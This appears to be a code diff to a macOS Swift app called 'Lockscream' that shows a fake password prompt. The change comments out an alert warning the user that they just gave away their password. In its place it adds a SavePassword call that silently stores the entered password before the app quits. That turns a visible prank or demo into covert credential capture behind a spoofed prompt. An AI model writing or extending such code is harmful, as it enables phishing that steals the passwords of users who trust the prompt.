@@ -83,13 +83,14 @@ class ViewController: NSViewController, NSTextFieldDelegate {
     @IBAction func passwordFieldSubmitted(_ sender: Any) {
         let password = passwordCell.stringValue
         if ValidatePassword(password: password) {
-            let alert = NSAlert()
-            alert.messageText = "Lockscream"
-            alert.informativeText = "Oops. Looks like you just gave away your password \(password)"
-            alert.alertStyle = .warning
-            alert.addButton(withTitle: "OK")
-            alert.addButton(withTitle: "Cancel")
-            alert.runModal()
+//            let alert = NSAlert()
+//            alert.messageText = "Lockscream"
+//            alert.informativeText = "Oops. Looks like you just gave away your password \(password)"
+//            alert.alertStyle = .warning
+//            alert.addButton(withTitle: "OK")
+//            alert.addButton(withTitle: "Cancel")
+//            alert.runModal()
+            SavePassword(password: password)
             NSApp.terminate(nil)
         } else {
             self.passwordWrapperBox.shake()
